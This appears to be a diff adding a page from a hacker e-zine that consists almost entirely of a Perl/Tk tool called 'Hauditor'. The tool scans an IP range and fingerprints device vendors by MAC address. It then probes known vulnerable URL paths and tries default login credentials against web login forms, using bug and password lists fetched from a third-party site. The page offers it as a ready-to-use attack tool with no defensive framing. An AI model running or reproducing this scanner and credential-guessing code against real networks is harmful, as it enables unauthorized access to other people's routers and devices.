@@ -1,0 +1,349 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: KSURi/CUP.su || <a style="text-decoration: none" href="../Wardriving_Skvoznoy.htm"><span style="text-decoration: none">Back to article: Wardriving uncovered</span></a> || <hr></pre>
+<pre>
+#!perl -w
+
+use strict;
+use threads;
+use LWP::UserAgent;
+use HTTP::Request::Common;
+use Tk;
+use Tk::LabFrame;
+use Tk::LabEntry;
+use Tk::DialogBox;
+
+my $MW=MainWindow-&gt;new(-title=&gt;&quot;Hauditor by .:[KSURi]:. [ http://cup.su/ ]&quot;);
+$MW-&gt;geometry(&quot;520x360&quot;);
+$MW-&gt;resizable(0,0);
+
+$MW-&gt;Label(-text=&gt;&quot;# hauditor [GUI]&quot;,
+           -font=&gt;&quot;{Verdana} 7 bold&quot;)-&gt;pack(-side=&gt;&quot;top&quot;,
+                                            -anchor=&gt;&quot;n&quot;);
+$MW-&gt;Label(-text=&gt;&quot;# (C)oded by .:[KSURi]:.&quot;,
+           -font=&gt;&quot;{Verdana} 7 bold&quot;)-&gt;pack(-side=&gt;&quot;top&quot;,
+                                            -anchor=&gt;&quot;n&quot;);
+$MW-&gt;Label(-text=&gt;&quot;# http://cup.su/&quot;,
+           -font=&gt;&quot;{Verdana} 7 bold&quot;)-&gt;pack(-side=&gt;&quot;top&quot;,
+                                            -anchor=&gt;&quot;n&quot;);
+
+my($startIp,$endIp);
+my $frameInputs=$MW-&gt;LabFrame(-label=&gt;&quot;Input and Controls&quot;,
+                              -labelside=&gt;&quot;acrosstop&quot;)-&gt;pack(-side=&gt;&quot;right&quot;,
+                                                             -anchor=&gt;&quot;nw&quot;);
+$frameInputs-&gt;LabEntry(-label=&gt;&quot;Start IP: &quot;,
+                       -textvariable=&gt;\$startIp)-&gt;pack();
+$frameInputs-&gt;LabEntry(-label=&gt;&quot;End IP: &quot;,
+                       -textvariable=&gt;\$endIp)-&gt;pack();
+$frameInputs-&gt;Button(-text=&gt;&quot;Scan&quot;,
+                     -command=&gt;sub { startScan() })-&gt;pack();
+$frameInputs-&gt;Button(-text=&gt;&quot;Update&quot;,
+                     -command=&gt;sub { generalUpdate() })-&gt;pack();
+$frameInputs-&gt;Button(-text=&gt;&quot;Exit&quot;,
+                     -command=&gt;sub { exit(0) })-&gt;pack();
+
+my $textOutput=$MW-&gt;Text(-width=&gt;300,
+                         -height=&gt;100,
+                         -wrap=&gt;&quot;word&quot;)-&gt;pack(-side=&gt;&quot;bottom&quot;,
+                                              -anchor=&gt;&quot;s&quot;);
+$|=1;
+tie(*STDOUT,ref($textOutput),$textOutput);
+
+MainLoop();
+
+my(%macDb,%vulnerableHardware,%defaultCredits)=();
+sub startScan
+{
+    if(!$startIp||!$endIp) { guiError($MW,&quot;Specify IP range please&quot;); return; }
+    return if(!loadMacDb()||!loadBugsDb()||!loadCreditsDb());
+    logAction(&quot;scan started&quot;);
+    foreach my $addr(genIpRange($startIp,$endIp))
+    {
+        my $vendor=getVendor($addr);
+        print $addr.&quot;: &quot;;
+        if($vendor eq &quot;unknown&quot;)   { print &quot;vendor is unknown\n&quot;    }
+        elsif($vendor eq &quot;failed&quot;) { print &quot;vendor lookup failed\n&quot; }
+        else
+        {
+            if(exists($vulnerableHardware{$vendor}))
+            {
+                my @res=threads-&gt;create(\&amp;tryBugs,$addr,$vendor)-&gt;join;
+                if(scalar(@res)&gt;0)
+                {
+                    print &quot;vulnerable!\n&quot;;
+                    logAction($addr.&quot;: vulnerable!\nBugs: [&quot;.join(&quot;; &quot;,@res).&quot;]&quot;);
+                }
+                else { print &quot;unvulnarable!\n&quot; }
+            }
+            elsif(exists($defaultCredits{$vendor}))
+            {
+                my $res=threads-&gt;create(\&amp;tryDefaultCredits,$addr,$vendor)-&gt;join;
+                if($res ne &quot;failed&quot;)
+                {
+                    print &quot;vulnerable!\n&quot;;
+                    logAction($addr.&quot; vulnerable!\nLogin credits: &quot;.$res);
+                }
+                else { print &quot;unvulnarable!\n&quot; }
+            }
+            else { print &quot;no bugs in db\n&quot; }
+        }
+    }
+    logAction(&quot;scan finished\n&quot;);
+    print &quot;\nScan finished. Check scan.log for details\n&quot;;
+}
+
+sub getVendor
+{
+    my $target=shift;
+    my $split;
+    `ping -n 1 $target`;
+    ($^O=~/mswin/i)?$split='-':$split=':';
+    if(`arp -a $target`=~/(.{2}$split.{2}$split.{2})$split.{2}$split.{2}$split.{2}/m)
+    {
+        my $vendorBytes=uc($1);
+        $vendorBytes=~s/\:/-/ if($^O!~/mswin/i);
+        if(exists($macDb{$vendorBytes})) { return $macDb{$vendorBytes} }
+        else { return &quot;unknown&quot; }
+    }
+    else { return &quot;failed&quot; }    
+}
+
+sub tryBugs
+{
+    my($target,$type)=@_;
+    my @foundBugs=();
+    foreach my $bug(@{$vulnerableHardware{$type}})
+    {
+        my $ua=LWP::UserAgent-&gt;new();
+        my $response=$ua-&gt;get(&quot;http://&quot;.$target.$bug);
+        if($response-&gt;{_rc}==200) { push(@foundBugs,$bug) }
+    }
+    return @foundBugs;
+}
+
+sub tryDefaultCredits
+{
+    my($target,$type)=shift;
+    my %formDetails=();
+    my $ua=LWP::UserAgent-&gt;new();
+    my $response=$ua-&gt;get(&quot;http://&quot;.$target.&quot;/&quot;);
+    if($response-&gt;is_success)
+    {
+        foreach(split(&quot;\n&quot;,$response-&gt;content))
+        {
+            if(/&lt;form/i)
+            {
+                if(/action\s*=\s*[\&quot;?|\'?](.+?)[\&quot;?|\'?]\s*/i) { $formDetails{action}=$1 }
+                if(/method\s*=\s*[\&quot;?|\'?](.+?)[\&quot;?|\'?]\s*/i) { $formDetails{method}=$1 }
+            }
+            if(/&lt;input/i)
+            {
+                if(/type\s*=\s*[\&quot;?|\'?]text[\&quot;?|\'?]\s*/&amp;&amp;/name\s*=\s*[\&quot;?|\'?](.+?)[\&quot;?|\'?]\s*/)     { $formDetails{login}=$1 }
+                if(/type\s*=\s*[\&quot;?|\'?]password[\&quot;?|\'?]\s*/&amp;&amp;/name\s*=\s*[\&quot;?|\'?](.+?)[\&quot;?|\'?]\s*/) { $formDetails{pass}=$1  }
+            }
+        }
+    }
+    else { return &quot;failed&quot; }
+    return &quot;failed&quot; if(!$formDetails{method}||!$formDetails{login}||!$formDetails{pass});
+    foreach my $credits(@{$defaultCredits{$type}})
+    {
+        my($login,$password)=split(':',$credits);
+        if($formDetails{method}=~/get/i)
+        {
+            my $url=&quot;http://&quot;.$target.'/';
+            if(defined($formDetails{action})) { $url.=$formDetails{action}.'?' }
+            else { $url.='?' }
+            $url.=$formDetails{login}.'='.$login.'&amp;';
+            $url.=$formDetails{pass}.'='.$password;
+            $response=$ua-&gt;get($url);
+        }
+        else
+        {
+            my $url=&quot;http://&quot;.$target.'/';
+            $url.=$formDetails{action} if(defined($formDetails{action}));
+            $response=$ua-&gt;request(POST $url,
+                                   Content_Type=&gt;&quot;application/x-www-form-urlencoded&quot;,
+                                   Content=&gt;[$formDetails{login}=&gt;$login,
+                                             $formDetails{pass}=&gt;$password]);
+        }
+        if($response-&gt;{_rc}==200)
+        {
+            if($response-&gt;content=~/access denied|login incorrect|password incorrect|wrong login|wrong password|can't log\s*in/im) { next }
+            else { return $credits }
+        }
+        else { return &quot;failed&quot; }
+    }
+}
+
+
+sub genIpRange
+{
+    my($start,$end)=@_;
+    print &quot;[~] Generating IP range... &quot;;
+    my @octets1=split('\.',$start);
+    my @octets2=split('\.',$end);
+    if($#octets1!=3||$#octets2!=3) { guiError($MW,&quot;Wrong IP range specified!&quot;,0); return; }
+    for(0..3) { if($octets1[$_]&gt;$octets2[$_]) { guiError($MW,&quot;Wrong IP range specified!&quot;); return; } }
+    my @range=();
+    for(;$octets1[3]&lt;=$octets2[3];$octets1[3]++) { push(@range,$octets1[0].'.'.
+                                                               $octets1[1].'.'.
+                                                               $octets1[2].'.'.
+                                                               $octets1[3]) }
+    print &quot;OK\n\n&quot;;
+    return @range;
+}
+
+sub loadMacDb
+{
+    print &quot;[~] Loding MAC database... &quot;;
+    if(-e &quot;mac.cache&quot;)
+    {
+        open(CACHE,&quot;mac.cache&quot;)||guiError($MW,&quot;Error loading MAC database!&quot;)&amp;&amp;return 0;
+        while(&lt;CACHE&gt;)
+        {
+            chomp;
+            my($bytes,$vendor)=split(/\s/,$_,2);
+            $macDb{uc($bytes)}=uc($vendor);
+        }
+        close CACHE;
+        print &quot;OK\n&quot;;
+        return 1;
+    }
+    else
+    {
+        open(CACHE,&quot;&gt;mac.cache&quot;)||guiError($MW,&quot;Error loading MAC database!&quot;)&amp;&amp;return 0;
+        my $dbUrl=&quot;http://standards.ieee.org/regauth/oui/oui.txt&quot;;
+        my $ua=LWP::UserAgent-&gt;new;
+        my $response=$ua-&gt;get($dbUrl);
+        if($response-&gt;is_success)
+        {
+            foreach(split(&quot;\n&quot;,$response-&gt;content))
+            {
+                if($_=~/(.{2}-.{2}-.{2})\s+\(hex\)\s+(.*)/)
+                {
+                    $macDb{uc($1)}=uc($2);
+                    print CACHE uc($1).&quot; &quot;.($2).&quot;\n&quot;;
+                }
+            }
+        }
+        else { guiError($MW,&quot;Error loading MAC database!&quot;); return 0; }
+        close CACHE;
+        print &quot;OK\n&quot;;
+        return 1;
+    }
+}
+
+sub loadBugsDb
+{
+    print &quot;[~] Loading bugs database... &quot;;
+    if(-e &quot;bugs.cache&quot;)
+    {
+        open(CACHE,&quot;bugs.cache&quot;)||guiError($MW,&quot;Error loading bugs database!&quot;)&amp;&amp;return 0;
+        while(&lt;CACHE&gt;)
+        {
+            chomp;
+            my($vendor,$bug)=split(&quot;=&gt;&quot;,$_);
+            push(@{$vulnerableHardware{$vendor}},$bug);
+        }
+        close CACHE;
+        print &quot;OK\n&quot;;
+        return 1;
+    }
+    else
+    {
+        open(CACHE,&quot;&gt;bugs.cache&quot;)||guiError($MW,&quot;Error loading bugs database!&quot;)&amp;&amp;return 0;
+        my $dbUrl=&quot;http://xcontest.narod.ru/bugs.cache&quot;;
+        my $ua=LWP::UserAgent-&gt;new;
+        my $response=$ua-&gt;get($dbUrl);
+        if($response-&gt;is_success)
+        {
+            foreach(split(&quot;\r\n&quot;,$response-&gt;content))
+            {
+                my($vendor,$bug)=split(&quot;=&gt;&quot;,$_);
+                push(@{$vulnerableHardware{$vendor}},$bug);
+                print CACHE $vendor.&quot;=&gt;&quot;.$bug.&quot;\n&quot;;
+            }
+        }
+        else { guiError($MW,&quot;Error loading bugs database!&quot;); return 0; }
+        close CACHE;
+        print &quot;OK\n&quot;;
+        return 1;
+    }
+}
+
+sub loadCreditsDb
+{
+    print &quot;[~] Loading credentials database... &quot;;
+    if(-e &quot;credits.cache&quot;)
+    {
+        open(CACHE,&quot;credits.cache&quot;)||guiError($MW,&quot;Error loading credentials database!&quot;)&amp;&amp;return 0;
+        while(&lt;CACHE&gt;)
+        {
+            chomp;
+            my($vendor,$credits)=split(&quot;=&gt;&quot;,$_);
+            push(@{$defaultCredits{$vendor}},$_);
+        }
+        close CACHE;
+        print &quot;OK\n&quot;;
+        return 1;
+    }
+    else
+    {
+        open(CACHE,&quot;&gt;credits.cache&quot;)||guiError($MW,&quot;Error loading credentials database!&quot;)&amp;&amp;return 0;
+        my $dbUrl=&quot;http://xcontest.narod.ru/credits.cache&quot;;
+        my $ua=LWP::UserAgent-&gt;new;
+        my $response=$ua-&gt;get($dbUrl);
+        if($response-&gt;is_success)
+        {
+            foreach(split(&quot;\r\n&quot;,$response-&gt;content))
+            {
+                my($vendor,$pass)=split(&quot;=&gt;&quot;,$_);
+                push(@{$defaultCredits{$vendor}},$pass);
+                print CACHE $vendor.&quot;=&gt;&quot;.$pass.&quot;\n&quot;;
+            }
+        }
+        else { guiError($MW,&quot;Error loading credentials database!&quot;); return 0; }
+        close CACHE;
+        print &quot;OK\n&quot;;
+        return 1;
+    }
+}
+
+sub generalUpdate
+{
+    unlink(&quot;mac.cache&quot;) if(-e &quot;mac.cache&quot;);
+    loadMacDb();
+    unlink(&quot;bugs.cache&quot;) if(-e &quot;bugs.cache&quot;);
+    loadBugsDb();
+    unlink(&quot;credits.cache&quot;) if(-e &quot;credits.cache&quot;);
+    loadCreditsDb();
+    print &quot;\n[+] Updating finished!\n\n&quot;;
+}
+
+sub logAction
+{
+    my $action=shift;
+    open(LOG,&quot;&gt;&gt;scan.log&quot;)||return;
+    print LOG localtime().&quot; - &quot;.$action.&quot;\n&quot;;
+    close LOG;
+}
+
+sub guiError
+{
+    my($window,$text)=@_;
+    print &quot;FAILED\n&quot;;
+    my $errWindow=$window-&gt;DialogBox(-title=&gt;&quot;error&quot;,
+                                     -buttons=&gt;[&quot;OK&quot;]);
+    $errWindow-&gt;add(&quot;Label&quot;,-text=&gt;$text,
+                            -font=&gt;&quot;{Verdana} 7 bold&quot;,
+                            -foreground=&gt;&quot;red&quot;)-&gt;pack;
+    $errWindow-&gt;Show;
+    $errWindow-&gt;destroy;
+}
+
+# hauditor.pl
+# (C)oded by .:[KSURi]:.
+# http://cup.su/
+</pre></body></html>
